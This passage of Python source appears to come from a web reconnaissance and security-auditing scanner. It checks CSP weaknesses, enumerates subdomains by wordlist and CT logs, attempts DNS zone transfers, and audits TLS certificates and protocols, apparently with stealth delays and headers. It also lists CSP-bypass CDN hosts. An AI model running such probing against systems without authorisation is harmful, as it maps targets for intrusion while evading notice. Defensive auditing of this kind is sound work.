
    Severity:
      HIGH   — directive makes XSS directly exploitable
               (unsafe-inline in script-src, wildcard script-src, missing default-src)
      MEDIUM — weakens defence-in-depth without direct XSS enablement
               (unsafe-eval, data: URIs, overly broad img-src)
    """
    issues = []
    csp    = csp_value.lower()

    # Parse directives into a dict: directive → value string
    directives = {}
    for part in csp_value.split(";"):
        part = part.strip()
        if not part:
            continue
        tokens = part.split(None, 1)
        directive = tokens[0].lower()
        value     = tokens[1].lower() if len(tokens) > 1 else ""
        directives[directive] = value

    # ── 1. Missing default-src ──────────────────────────────────
    # Without default-src, browsers fall back to allowing everything
    # for directives not explicitly set.
    if "default-src" not in directives and "script-src" not in directives:
        issues.append({
            "severity": "HIGH",
            "issue":    "Missing default-src and script-src",
            "detail":   "No fallback directive — browser allows inline scripts and arbitrary sources"
        })

    # ── 2. unsafe-inline in script-src or default-src ──────────
    # Allows any inline <script> tag to execute — directly enables XSS.
    for directive in ("script-src", "default-src"):
        val = directives.get(directive, "")
        if "'unsafe-inline'" in val or "unsafe-inline" in val:
            issues.append({
                "severity": "HIGH",
                "issue":    f"'unsafe-inline' in {directive}",
                "detail":   "Inline scripts permitted — any XSS payload executes without restriction"
            })
            break  # Only report once

    # ── 3. Wildcard (*) in script-src or default-src ───────────
    # Allows scripts from any origin — CSP provides no protection.
    for directive in ("script-src", "default-src"):
        val = directives.get(directive, "")
        tokens = val.split()
        if "*" in tokens or "'*'" in tokens:
            issues.append({
                "severity": "HIGH",
                "issue":    f"Wildcard '*' in {directive}",
                "detail":   "Scripts from any domain are permitted — policy provides no origin restriction"
            })
            break

    # ── 4. unsafe-eval in script-src or default-src ────────────
    # Allows eval(), setTimeout(string), Function() constructor —
    # common XSS escalation vectors even without inline scripts.
    for directive in ("script-src", "default-src"):
        val = directives.get(directive, "")
        if "'unsafe-eval'" in val or "unsafe-eval" in val:
            issues.append({
                "severity": "MEDIUM",
                "issue":    f"'unsafe-eval' in {directive}",
                "detail":   "eval() and dynamic code execution permitted — enables script injection via eval-based sinks"
            })
            break

    # ── 5. data: URI in script-src ─────────────────────────────
    # Allows scripts as base64-encoded data: URIs — XSS bypass.
    for directive in ("script-src", "default-src"):
        val = directives.get(directive, "")
        if "data:" in val.split():
            issues.append({
                "severity": "HIGH",
                "issue":    f"'data:' URI scheme in {directive}",
                "detail":   "Scripts can be loaded as base64 data: URIs — common CSP bypass technique"
            })
            break

    # ── 6. Overly broad script-src hosts ───────────────────────
    # CDN domains that host user content or JSONP endpoints are
    # well-known CSP bypass vectors.
    BYPASS_HOSTS = [
        "*.googleapis.com", "ajax.googleapis.com",
        "*.cloudflare.com", "cdnjs.cloudflare.com",
        "*.jsdelivr.net", "cdn.jsdelivr.net",
        "*.unpkg.com", "unpkg.com",
        "*.github.io",  # user-controlled content
        "*.s3.amazonaws.com",
        "*.blob.core.windows.net",
    ]
    for directive in ("script-src", "default-src"):
        val = directives.get(directive, "")
        for bypass in BYPASS_HOSTS:
            if bypass.lower() in val or bypass.lower().lstrip("*.") in val:
                issues.append({
                    "severity": "MEDIUM",
                    "issue":    f"Bypassable CDN host in {directive}: {bypass}",
                    "detail":   f"{bypass} hosts user-controllable content or JSONP — allows CSP bypass"
                })

    # ── 7. Missing frame-ancestors ─────────────────────────────
    # Without frame-ancestors, X-Frame-Options is the only clickjacking
    # protection. CSP frame-ancestors supersedes XFO in modern browsers.
    if "frame-ancestors" not in directives:
        issues.append({
            "severity": "MEDIUM",
            "issue":    "Missing frame-ancestors directive",
            "detail":   "No CSP clickjacking protection — relies solely on X-Frame-Options if present"
        })

    # ── 8. report-uri / report-to absence ──────────────────────
    # Not a vulnerability, just informational — skip alerting.

    if not issues:
        print(timestamp() + f" CSP OK on {domain}")
        return

    # Collate all issues into one alert per domain
    high_issues   = [i for i in issues if i["severity"] == "HIGH"]
    medium_issues = [i for i in issues if i["severity"] == "MEDIUM"]
    severity      = "HIGH" if high_issues else "MEDIUM"

    all_details = "; ".join(
        f"[{i['severity']}] {i['issue']}: {i['detail']}"
        for i in issues
    )

    alert(
        "WEAK CONTENT SECURITY POLICY",
        severity,
        domain,
        f"{len(issues)} CSP weakness(es) found — {all_details[:400]}"
    )
    print(timestamp() + f" CSP weaknesses [{severity}] on {domain}: "
          + ", ".join(i["issue"] for i in issues))

# ─────────────────────────────────────────────
# Subdomain enumeration
# ─────────────────────────────────────────────

# Track which root domains we've already enumerated to avoid repeating
_enumerated_roots = set()

def detect_wildcard(root_domain):
    """
    Probe two independently random subdomains that cannot possibly exist.
    If both resolve, wildcard DNS is confirmed. Returns a set of wildcard
    IPs (handles round-robin wildcards that rotate between addresses).
    Returns empty set if no wildcard.
    """
    import uuid
    wildcard_ips = set()
    for _ in range(2):
        random_sub = uuid.uuid4().hex[:12] + "." + root_domain
        try:
            ip = socket.gethostbyname(random_sub)
            wildcard_ips.add(ip)
        except socket.gaierror:
            # At least one random subdomain didn't resolve — no wildcard
            return set()
    if wildcard_ips:
        print(timestamp() + " Wildcard DNS detected for " + root_domain + " -> " + str(wildcard_ips))
    return wildcard_ips

def enumerate_subdomains(domain):
    """
    Try DNS resolution for common subdomains of the root domain.
    Detects wildcard DNS first to avoid false positives.
    Saves confirmed live subdomains to Subdomains table.
    """
    root = extract_root_domain(domain)
    if root in _enumerated_roots:
        return
    _enumerated_roots.add(root)

    # Wildcard check - if random subdomains resolve, the host answers
    # everything. We still enumerate but filter results matching any
    # wildcard IP so genuine subdomains on different IPs survive.
    wildcard_ips = detect_wildcard(root)
    if wildcard_ips:
        print(timestamp() + " Wildcard active on " + root + " -- filtering IPs: " + str(wildcard_ips))

    print(timestamp() + " Subdomain enumeration for " + root + " (" + str(len(SUBDOMAIN_WORDLIST)) + " probes)...")
    found_lock = threading.Lock()
    found = [0]

    def _probe_sub(sub):
        if _stop_event.is_set():
            return
        fqdn = sub + "." + root
        try:
            ip = socket.gethostbyname(fqdn)

            # Skip if IP matches any known wildcard IP
            if wildcard_ips and ip in wildcard_ips:
                return

            # Verify it's actually responding over HTTP/HTTPS
            resp = safe_get("https://" + fqdn, timeout=4, method="head")
            if not resp:
                resp = safe_get("http://" + fqdn, timeout=4, method="head")
            status = resp.status_code if resp else None

            # Secondary wildcard guard: CDNs like Cloudflare resolve wildcard
            # DNS to a shared IP AND return HTTP 200 for every hit. Even after
            # IP-level filtering above, double-check: if wildcard_ips is set
            # and this IP is in it, this is a catch-all response — not a real
            # service. Skip alert and takeover check.
            if wildcard_ips and ip in wildcard_ips:
                return

            print(timestamp() + " " + _c("Subdomain found:", Fore.GREEN) + " " + fqdn + " -> " + ip + (" [" + str(status) + "]" if status else ""))
            write_to_subdomains_database(root, fqdn, ip, status)
            _subdomain_enriched.add(fqdn)
            with found_lock:
                found[0] += 1

            label = sub.lower()
            if label in HIGH_VALUE_SUBDOMAINS and status and status < 400:
                _alert_high_value_subdomain(fqdn, label, ip, status)

            # Subdomain takeover check on every confirmed live subdomain
            check_subdomain_takeover(fqdn)
        except (socket.gaierror, socket.timeout):
            pass   # doesn't resolve - expected for most
        except Exception as e:
            print_error("subdomain probe error for " + fqdn + ": " + str(e))

    from concurrent.futures import ThreadPoolExecutor, as_completed as _as_completed
    with ThreadPoolExecutor(max_workers=20) as _ex:
        _futs = [_ex.submit(_probe_sub, sub) for sub in SUBDOMAIN_WORDLIST]
        for _f in _as_completed(_futs):
            pass

    print(timestamp() + " Subdomain enumeration complete for " + root + " -- " + str(found[0]) + " found.")

# ─────────────────────────────────────────────
# Certificate Transparency log mining
# ─────────────────────────────────────────────

_ct_queried          = set()
_subdomain_enriched  = set()   # tracks FQDNs enriched by any subdomain path (wordlist or CT)

def query_ct_logs(domain):
    """
    Query Certificate Transparency logs via crt.sh for subdomain discovery.
    Finds subdomains that wordlist enumeration misses — historical certs,
    wildcard certs, and subdomains with unusual names are all captured.
    Deduplicates against existing wordlist results via _enumerated_roots.
    """
    root = extract_root_domain(domain)
    if root in _ct_queried:
        return
    _ct_queried.add(root)

    print(timestamp() + " CT log query for " + root + " (crt.sh)...")
    try:
        stealth_delay("crt.sh")
        resp = _get_session().get(
            "https://crt.sh/",
            params={"q": f"%.{root}", "output": "json"},
            headers=stealth_headers({"Accept": "application/json"}),
            timeout=20,
        )
        if resp.status_code != 200:
            print_error(f"crt.sh returned {resp.status_code} for {root}")
            return
        entries = resp.json()
    except Exception as e:
        print_error(f"CT log query failed for {root}: {e}")
        return

    # Extract unique FQDNs from the name_value field (may contain SANs, one per line)
    found = set()
    for entry in entries:
        for name in entry.get("name_value", "").splitlines():
            name = name.strip().lstrip("*.")
            if name and name != root and name.endswith("." + root):
                found.add(name)

    if not found:
        print(timestamp() + " CT logs: no additional subdomains found for " + root)
        return

    print(timestamp() + f" CT logs: {len(found)} unique subdomains from crt.sh for {root} — verifying...")

    wildcard_ips = detect_wildcard(root)
    confirmed = 0

    for fqdn in sorted(found):
        try:
            ip = socket.gethostbyname(fqdn)

            if wildcard_ips and ip in wildcard_ips:
                continue

            resp_h = safe_get("https://" + fqdn, timeout=4, method="head")
            if not resp_h:
                resp_h = safe_get("http://" + fqdn, timeout=4, method="head")
            status = resp_h.status_code if resp_h else None

            # Second wildcard guard after HTTP probe
            if wildcard_ips and ip in wildcard_ips:
                continue

            print(timestamp() + " " + _c("CT subdomain live:", Fore.GREEN) + " " + fqdn + " -> " + ip
                  + (" [" + str(status) + "]" if status else ""))
            write_to_subdomains_database(root, fqdn, ip, status)
            confirmed += 1

            label = fqdn.split(".")[0].lower()
            if label in HIGH_VALUE_SUBDOMAINS and status and status < 400:
                _alert_high_value_subdomain(fqdn, label, ip, status, source="CT logs")

            check_subdomain_takeover(fqdn)

            # Enrich confirmed live CT subdomains — only if not already found
            # by the wordlist brute-force path to avoid duplicate enrichment.
            if fqdn not in _subdomain_enriched:
                _subdomain_enriched.add(fqdn)
                enrich_domain("https://" + fqdn)

        except (socket.gaierror, socket.timeout):
            pass
        except Exception as e:
            print_error(f"CT subdomain probe error for {fqdn}: {e}")

    print(timestamp() + f" CT log enumeration complete for {root} — {confirmed} live subdomains confirmed.")

# ─────────────────────────────────────────────
# Technology fingerprinting
# ─────────────────────────────────────────────

def fingerprint_technologies(url, response_headers, html_content):
    detected = []
    try:
        headers_lc = {k.lower(): str(v).lower() for k, v in response_headers.items()} if hasattr(response_headers, 'items') else {}
        html_str = html_content.decode("utf-8", errors="ignore").lower() if isinstance(html_content, bytes) else str(html_content).lower()
        for tech, sigs in TECH_SIGNATURES.items():
            found = False
            for h in sigs["headers"]:
                if ": " in h:
                    hname, hval = h.split(": ", 1)
                    if hval.lower() in headers_lc.get(hname.lower(), ""):
                        found = True
                        break
                else:
                    if h.lower() in headers_lc:
                        found = True
                        break
            if not found:
                found = any(p.lower() in html_str for p in sigs["html"])
            if found:
                detected.append(tech)
        if detected:
            print(timestamp() + " Technologies on " + url + ": " + ", ".join(detected))
            for tech in detected:
                write_to_tech_database(url, tech)
    except Exception as e:
        print_error("fingerprint: " + str(e))
    return detected

# ─────────────────────────────────────────────
# Robots.txt
# ─────────────────────────────────────────────

def fetch_robots_txt(base_url):
    robots_url = urljoin(base_url, "/robots.txt")
    try:
        resp = safe_get(robots_url, timeout=REQUEST_TIMEOUT)
        if resp and resp.status_code == 200:
            content = resp.text
            print(timestamp() + " robots.txt found for " + base_url)
            write_to_robots_database(base_url, content)
            rp = RobotFileParser()
            rp.set_url(robots_url)
            rp.parse(content.splitlines())
            return rp
        else:
            print(timestamp() + " No robots.txt for " + base_url)
    except Exception as e:
        print_error("robots.txt fetch failed for " + base_url + ": " + str(e))
    return None

def is_allowed_by_robots(rp, url):
    if rp is None:
        return True
    try:
        return rp.can_fetch("*", url)
    except Exception:
        return True

# ─────────────────────────────────────────────
# Sitemap.xml
# ─────────────────────────────────────────────

def fetch_sitemap(base_url):
    urls_found = []
    sitemap_url = urljoin(base_url, "/sitemap.xml")
    try:
        resp = safe_get(sitemap_url, timeout=REQUEST_TIMEOUT)
        if resp and resp.status_code == 200:
            soup = BeautifulSoup(resp.content, "xml")
            locs = soup.find_all("loc")
            total = len(locs)
            for loc in locs[:SITEMAP_CAP]:
                u = loc.text.strip()
                urls_found.append(u)
                write_to_sitemap_database(base_url, u)
            if total > SITEMAP_CAP:
                print(timestamp() + " Sitemap has " + str(total) + " URLs — capped at " + str(SITEMAP_CAP))
            else:
                print(timestamp() + " Sitemap found " + str(total) + " URLs for " + base_url)
        else:
            print(timestamp() + " No sitemap.xml for " + base_url)
    except Exception as e:
        print_error("Sitemap fetch failed: " + str(e))
    return urls_found

# ─────────────────────────────────────────────
# DNS
# ─────────────────────────────────────────────

def dns_lookup(domain):
    try:
        result = dns.resolver.resolve(domain, 'A')
        for ipval in result:
            ip = ipval.to_text()
            print(timestamp() + " DNS " + domain + " → " + ip)
            write_to_dns_database(domain, ip)
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
            dns.exception.Timeout, dns.resolver.NoNameservers) as e:
        print_error("DNS lookup failed for " + domain + ": " + str(e))

def mx_lookup(domain):
    try:
        records = dns.resolver.resolve(domain, 'MX')
        for record in records:
            mx_host = str(record.exchange).rstrip('.')
            preference = record.preference
            print(timestamp() + " MX " + domain + " → " + mx_host + " (pri " + str(preference) + ")")
            write_to_mx_database(domain, mx_host, preference)
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
            dns.exception.Timeout, dns.resolver.NoNameservers) as e:
        print_error("MX lookup failed for " + domain + ": " + str(e))

# ─────────────────────────────────────────────
# DNS zone transfer (AXFR)
# ─────────────────────────────────────────────

import dns.zone
import dns.query

_zone_transfer_checked = set()

def attempt_zone_transfer(domain):
    """
    Attempt a DNS zone transfer (AXFR) against every authoritative nameserver
    for the root domain.

    A successful AXFR dumps the entire DNS zone — every subdomain, internal
    host, and IP address — in a single query. Misconfigured nameservers that
    allow this are a CRITICAL finding.

    On success, all discovered A/CNAME hostnames are fed back into the
    subdomain enumeration pipeline for liveness checking and enrichment.

    REFUSED responses and timeouts are skipped silently — this is expected
    behaviour for correctly configured nameservers.
    """
    root = extract_root_domain(domain)
    if root in _zone_transfer_checked:
        return
    _zone_transfer_checked.add(root)

    try:
        ns_records  = dns.resolver.resolve(root, 'NS')
        nameservers = [str(r.target).rstrip('.') for r in ns_records]
    except Exception as e:
        print_error(f"NS lookup failed for {root}: {e}")
        return

    print(timestamp() + f" Zone transfer attempt for {root} ({len(nameservers)} nameservers)...")

    for ns in nameservers:
        try:
            zone = dns.zone.from_xfr(dns.query.xfr(ns, root, timeout=5, lifetime=5))

            # ── Enumerate all records ──────────────────────────────
            records   = []
            hostnames = []   # FQDNs with A or CNAME records for pipeline feeding
            for name, node in zone.nodes.items():
                for rdataset in node.rdatasets:
                    rdtype     = dns.rdatatype.to_text(rdataset.rdtype)
                    name_str   = str(name)
                    fqdn       = root if name_str in ("@", "") else f"{name_str}.{root}"
                    for rdata in rdataset:
                        record_str = f"{fqdn} {rdtype} {rdata}"
                        records.append(record_str)
                        write_to_zone_transfer_database(root, ns, record_str)
                    if rdtype in ("A", "CNAME") and fqdn != root:
                        hostnames.append(fqdn)

            # Sample up to 8 hostnames for the alert detail
            sample = hostnames[:8]
            sample_str = ", ".join(sample) + ("…" if len(hostnames) > 8 else "")

            alert(
                "DNS ZONE TRANSFER ALLOWED (AXFR)",
                "CRITICAL",
                root,
                f"Nameserver {ns} allowed AXFR — {len(records)} records exposed, "
                f"{len(hostnames)} hostnames: {sample_str}. "
                f"Full DNS zone is publicly downloadable."
            )
            print(timestamp() + f" [!!] Zone transfer succeeded: {ns} → "
                                f"{len(records)} records, {len(hostnames)} hostnames for {root}")

            # ── Feed hostnames into the subdomain pipeline ─────────
            wildcard_ips = detect_wildcard(root)
            for fqdn in hostnames:
                if fqdn in _subdomain_enriched:
                    continue
                try:
                    ip = socket.gethostbyname(fqdn)
                    if wildcard_ips and ip in wildcard_ips:
                        continue
                    resp_h = safe_get("https://" + fqdn, timeout=4, method="head")
                    if not resp_h:
                        resp_h = safe_get("http://" + fqdn, timeout=4, method="head")
                    status = resp_h.status_code if resp_h else None
                    if wildcard_ips and ip in wildcard_ips:
                        continue

                    print(timestamp() + f" AXFR subdomain live: {fqdn} -> {ip}"
                                        + (f" [{status}]" if status else ""))
                    write_to_subdomains_database(root, fqdn, ip, status)
                    _subdomain_enriched.add(fqdn)

                    label = fqdn.split(".")[0].lower()
                    if label in HIGH_VALUE_SUBDOMAINS and status and status < 400:
                        _alert_high_value_subdomain(fqdn, label, ip, status,
                                                     source="zone transfer")
                    check_subdomain_takeover(fqdn)
                    enrich_domain("https://" + fqdn)

                except (socket.gaierror, socket.timeout):
                    pass
                except Exception as e:
                    print_error(f"AXFR subdomain probe error for {fqdn}: {e}")

            return  # One success is definitive — stop probing other NSes

        except (dns.exception.FormError, dns.exception.Timeout,
                EOFError, ConnectionResetError, OSError):
            # REFUSED or timeout — expected for correctly configured servers, skip silently
            pass
        except Exception as e:
            err_str = str(e).lower()
            if any(w in err_str for w in ("refused", "timeout", "timed out")):
                pass  # silently skip
            else:
                print_error(f"Zone transfer probe failed for {root} via {ns}: {e}")

def write_to_zone_transfer_database(root_domain, nameserver, record):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "ZoneTransfer")
        conn.execute(
            "INSERT INTO ZoneTransfer (root_domain,nameserver,record,found_at) VALUES (?,?,?,?)",
            (root_domain, nameserver, record, timestamp()))
    except Exception as e:
        print_error("write_to_zone_transfer_database: " + str(e))
    finally:
        conn.close()

# ─────────────────────────────────────────────
# SSL
# ─────────────────────────────────────────────

try:
    from cryptography import x509 as _x509
    from cryptography.hazmat.backends import default_backend as _crypto_backend
    _CRYPTO_AVAILABLE = True
except ImportError:
    _CRYPTO_AVAILABLE = False

# PyJWT is optional — enables JWT algorithm confusion detection
try:
    import jwt as _pyjwt
    import jwt.algorithms as _pyjwt_algs
    _PYJWT_AVAILABLE = True
except ImportError:
    _PYJWT_AVAILABLE = False

# sslyze is optional — provides deep TLS protocol + cipher suite analysis.
# Falls back to Python's ssl module when not installed.
try:
    from sslyze import (
        Scanner              as _SslyzeScanner,
        ServerNetworkLocation as _SslyzeLocation,
        ServerScanRequest    as _SslyzeScanRequest,
        ScanCommand          as _SslyzeCmd,
    )
    _SSLYZE_AVAILABLE = True
except ImportError:
    _SSLYZE_AVAILABLE = False

def get_ssl_info(domain):
    try:
        from datetime import timezone
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert        = ssock.getpeercert()
                issuer      = dict(x[0] for x in cert.get('issuer', []))
                subject     = dict(x[0] for x in cert.get('subject', []))
                issuer_name = issuer.get('organizationName', 'Unknown')
                common_name = subject.get('commonName', 'Unknown')
                not_before  = cert.get('notBefore', 'Unknown')
                not_after   = cert.get('notAfter', 'Unknown')
                print(timestamp() + " SSL " + domain + " expires " + not_after)
                write_to_ssl_database(domain, common_name, issuer_name, not_before, not_after)

                # ── Expiry check ──────────────────────────────────────
                if not_after and not_after != 'Unknown':
                    try:
                        expiry_dt = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
                        days_left = (expiry_dt - datetime.now(timezone.utc)).days
                        if days_left < 0:
                            alert(
                                "SSL CERTIFICATE EXPIRED",
                                "CRITICAL",
                                domain,
                                f"Certificate expired {abs(days_left)} days ago ({not_after})"
                            )
                        elif days_left <= 14:
                            alert(
                                "SSL CERTIFICATE EXPIRING SOON",
                                "HIGH",
                                domain,
                                f"Certificate expires in {days_left} days ({not_after})"
                            )
                    except Exception:
                        pass

                # ── Self-signed check ─────────────────────────────────
                # Self-signed: issuer CN/O matches subject CN/O
                issuer_cn = issuer.get('commonName', '')
                subject_cn = subject.get('commonName', '')
                issuer_org = issuer.get('organizationName', '')
                subject_org = subject.get('organizationName', '')
                if issuer_cn and issuer_cn == subject_cn:
                    alert(
                        "SELF-SIGNED SSL CERTIFICATE",
                        "HIGH",
                        domain,
                        f"Certificate is self-signed (issuer CN = subject CN = '{issuer_cn}'). "
                        f"Clients cannot verify authenticity."
                    )
                elif issuer_org and issuer_org == subject_org and issuer_org not in ('', 'Unknown'):
                    alert(
                        "SELF-SIGNED SSL CERTIFICATE",
                        "HIGH",
                        domain,
                        f"Certificate appears self-signed (issuer org = subject org = '{issuer_org}')."
                    )

                # ── Deep analysis via cryptography library ────────────
                if _CRYPTO_AVAILABLE:
                    try:
                        raw_cert = ssock.getpeercert(binary_form=True)
                        cert_obj = _x509.load_der_x509_certificate(raw_cert, _crypto_backend())

                        # Signature algorithm — flag SHA1/MD5 as weak
                        sig_alg = cert_obj.signature_hash_algorithm
                        if sig_alg:
                            alg_name = sig_alg.name.lower()
                            if alg_name in ("sha1", "md5", "md2"):
                                alert(
                                    f"WEAK SSL SIGNATURE ALGORITHM: {alg_name.upper()}",
                                    "HIGH",
                                    domain,
                                    f"Certificate uses deprecated {alg_name.upper()} signature algorithm. "
                                    f"Vulnerable to collision attacks."
                                )

                        # Public key size — flag RSA/DSA < 2048, EC < 224
                        pub_key = cert_obj.public_key()
                        key_type = type(pub_key).__name__
                        key_size = getattr(pub_key, 'key_size', None)
                        if key_size:
                            from cryptography.hazmat.primitives.asymmetric import rsa as _rsa, dsa as _dsa, ec as _ec
                            if isinstance(pub_key, (_rsa.RSAPublicKey, _dsa.DSAPublicKey)) and key_size < 2048:
                                alert(
                                    f"WEAK SSL KEY SIZE: {key_size}-bit {key_type}",
                                    "HIGH",
                                    domain,
                                    f"Certificate uses {key_size}-bit key — below recommended 2048-bit minimum."
                                )
                            elif isinstance(pub_key, _ec.EllipticCurvePublicKey) and key_size < 224:
                                alert(
                                    f"WEAK SSL KEY SIZE: {key_size}-bit EC",
                                    "HIGH",
                                    domain,
                                    f"Certificate uses {key_size}-bit elliptic curve key — below recommended 224-bit minimum."
                                )

                        # Subject Alternative Names
                        try:
                            san_ext = cert_obj.extensions.get_extension_for_class(_x509.SubjectAlternativeName)
                            san_names = [str(n.value) for n in san_ext.value]
                            wildcard_sans = [s for s in san_names if s.startswith("*.")]
                            if wildcard_sans:
                                print(timestamp() + f" SSL wildcard SANs on {domain}: {', '.join(wildcard_sans)}")
                            print(timestamp() + f" SSL SANs ({len(san_names)}): {', '.join(san_names[:10])}"
                                  + (" ..." if len(san_names) > 10 else ""))
                        except Exception:
                            pass

                    except Exception as e:
                        print_error(f"SSL deep analysis failed for {domain}: {e}")

    except (ssl.SSLError, socket.timeout, socket.gaierror, ConnectionRefusedError, OSError) as e:
        print_error("SSL failed for " + domain + ": " + str(e))

# ─────────────────────────────────────────────
# TLS/SSL misconfiguration detection
# ─────────────────────────────────────────────

_tls_checked: set = set()

# Cipher name substrings → (severity, human label)
_WEAK_CIPHER_PATTERNS = [
    ("NULL",   "CRITICAL", "NULL cipher — no encryption"),
    ("EXPORT", "CRITICAL", "EXPORT cipher — FREAK vulnerability"),
    ("ANULL",  "CRITICAL", "anonymous cipher — no server authentication"),
    ("RC4",    "HIGH",     "RC4 cipher — broken encryption"),
    ("_DES",   "HIGH",     "DES cipher — SWEET32 vulnerability"),
    ("3DES",   "HIGH",     "3DES cipher — SWEET32 vulnerability"),
    ("_MD5",   "HIGH",     "MD5 MAC cipher"),
]

# Legacy versions testable via ssl.TLSVersion: (attr, severity, label, detail)
_LEGACY_TLS_VERSIONS = [
    ("SSLv3",   "HIGH",   "SSL 3.0",
     "POODLE vulnerability — padding oracle attack allows decryption of HTTPS"),
    ("TLSv1",   "MEDIUM", "TLS 1.0",
     "Deprecated since RFC 8996 (2021); vulnerable to BEAST and POODLE-over-TLS"),
    ("TLSv1_1", "MEDIUM", "TLS 1.1",
     "Deprecated since RFC 8996 (2021); lacks AEAD cipher suite support"),
]

_HSTS_MIN_MAX_AGE    = 180 * 86400   # 180 days in seconds
_CERT_EXPIRY_WARN_DAYS = 30          # flag LOW if cert expires within this many days


def _test_legacy_tls_version(host: str, port: int, version_attr: str,
                             timeout: int = 10) -> bool:
    """Return True if the server accepts the named legacy TLS version."""
    tls_ver = getattr(ssl.TLSVersion, version_attr, None)
    if tls_ver is None:
        return False   # version not supported by this Python/OpenSSL build
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        ctx.minimum_version = tls_ver
        ctx.maximum_version = tls_ver
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host):
                return True
    except (ssl.SSLError, OSError, socket.timeout):
        return False
    except Exception:
        return False


def _get_negotiated_cipher(host: str, port: int, timeout: int = 10) -> str:
    """Return the name of the cipher negotiated by default, or empty string."""
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                c = ssock.cipher()
                return c[0] if c else ""
    except Exception:
        return ""


def _check_hsts_header(domain: str, hsts_value) -> None:
    """Validate a Strict-Transport-Security header value.
    Skips the 'missing' case — that is already raised by check_security_headers."""
    if not hsts_value:
        return
    parts      = [d.strip().lower() for d in hsts_value.split(";")]
    directives = set(parts)
    max_age    = None
    for d in parts:
        if d.startswith("max-age="):
            try:
                max_age = int(d.split("=", 1)[1])
            except ValueError:
                pass

    if max_age is not None and max_age < _HSTS_MIN_MAX_AGE:
        alert(
            "HSTS MAX-AGE TOO SHORT",
            "LOW",
            domain,
            f"HSTS max-age={max_age}s ({max_age // 86400} days) is below the "
            f"recommended minimum of {_HSTS_MIN_MAX_AGE // 86400} days — "
            f"allows downgrade window after first visit",
        )
    if "includesubdomains" not in directives:
        alert(
            "HSTS MISSING INCLUDESUBDOMAINS",
            "LOW",
            domain,
            "Strict-Transport-Security lacks 'includeSubDomains' — "
            "subdomains can still be reached over plain HTTP",
        )
    if "preload" not in directives:
        alert(
            "HSTS MISSING PRELOAD",
            "INFO",
            domain,
            "Strict-Transport-Security lacks 'preload' — site is not eligible "
            "for browser HSTS preload list",
        )


def _check_cert_obj_tls(domain: str, cert_obj) -> None:
    """Check a cryptography cert object: 30-day expiry and weak signature algorithm."""
    if not _CRYPTO_AVAILABLE or cert_obj is None:
        return
    from datetime import timezone
    try:
        # cryptography >= 42 exposes not_valid_after_utc; older uses not_valid_after
        try:
            exp = cert_obj.not_valid_after_utc
        except AttributeError:
            exp = cert_obj.not_valid_after.replace(tzinfo=timezone.utc)
        days = (exp - datetime.now(timezone.utc)).days
        if 0 < days <= _CERT_EXPIRY_WARN_DAYS:
            alert(
                "TLS CERTIFICATE EXPIRING SOON",
                "LOW",
                domain,
                f"Certificate expires in {days} day(s) — renew before expiry to avoid outage",
            )
        sig_name = getattr(
            getattr(cert_obj, "signature_hash_algorithm", None), "name", ""
        ).lower()
        if sig_name in ("md5", "sha1", "md2"):
            alert(
                f"WEAK TLS SIGNATURE ALGORITHM: {sig_name.upper()}",
                "MEDIUM",
                domain,
                f"Certificate uses deprecated {sig_name.upper()} signature algorithm — "
                f"vulnerable to collision attacks",
            )
    except Exception:
        pass


def _check_cert_ct(domain: str, cert_obj) -> None:
    """Alert if the certificate has no embedded SCT (Certificate Transparency)."""
    if not _CRYPTO_AVAILABLE or cert_obj is None:
        return
    try:
        ct_oids = (
            _x509.oid.ExtensionOID.PRECERT_SIGNED_CERTIFICATE_TIMESTAMPS,
            _x509.oid.ExtensionOID.SIGNED_CERTIFICATE_TIMESTAMPS,
        )
        for oid in ct_oids:
            try:
                cert_obj.extensions.get_extension_for_oid(oid)
                return   # SCT present — CT satisfied
            except _x509.ExtensionNotFound:
                pass
        alert(
            "CERTIFICATE TRANSPARENCY NOT LOGGED",
            "LOW",
            domain,
            "Certificate contains no embedded SCT (Signed Certificate Timestamps) — "
            "may not be logged in public CT logs; modern browsers may reject it",
        )
    except Exception:
        pass


def _check_tls_sslyze(host: str, port: int, domain: str) -> None:
    """Deep TLS analysis using sslyze: protocol versions, cipher suites, cert, HSTS."""
    try:
        server_location = _SslyzeLocation(hostname=host, port=port)
        scan_request    = _SslyzeScanRequest(
            server_location=server_location,
            scan_commands={
                _SslyzeCmd.SSL_2_0_CIPHER_SUITES,
                _SslyzeCmd.SSL_3_0_CIPHER_SUITES,
                _SslyzeCmd.TLS_1_0_CIPHER_SUITES,
                _SslyzeCmd.TLS_1_1_CIPHER_SUITES,
                _SslyzeCmd.TLS_1_2_CIPHER_SUITES,
                _SslyzeCmd.TLS_1_3_CIPHER_SUITES,
                _SslyzeCmd.CERTIFICATE_INFO,
                _SslyzeCmd.HTTP_HEADERS,
            },
        )
        scanner = _SslyzeScanner()
        scanner.queue_scans([scan_request])

        for server_result in scanner.get_results():
            if server_result.scan_result is None:
                continue
            sr = server_result.scan_result

            # ── Protocol version checks ───────────────────────────────────
            proto_checks = [
                ("ssl_2_0_cipher_suites", "SSL 2.0", "CRITICAL",
                 "SSL 2.0 accepted — severely broken; no secure cipher modes exist"),
                ("ssl_3_0_cipher_suites", "SSL 3.0", "HIGH",
                 "SSL 3.0 accepted — POODLE vulnerability allows CBC padding oracle attack"),
                ("tls_1_0_cipher_suites", "TLS 1.0", "MEDIUM",
                 "TLS 1.0 accepted — deprecated since RFC 8996; vulnerable to BEAST/POODLE-over-TLS"),
                ("tls_1_1_cipher_suites", "TLS 1.1", "MEDIUM",
                 "TLS 1.1 accepted — deprecated since RFC 8996; lacks AEAD cipher support"),
            ]
            for attr, label, severity, detail in proto_checks:
                res = getattr(sr, attr, None)
                if res and getattr(res, "accepted_cipher_suites", []):
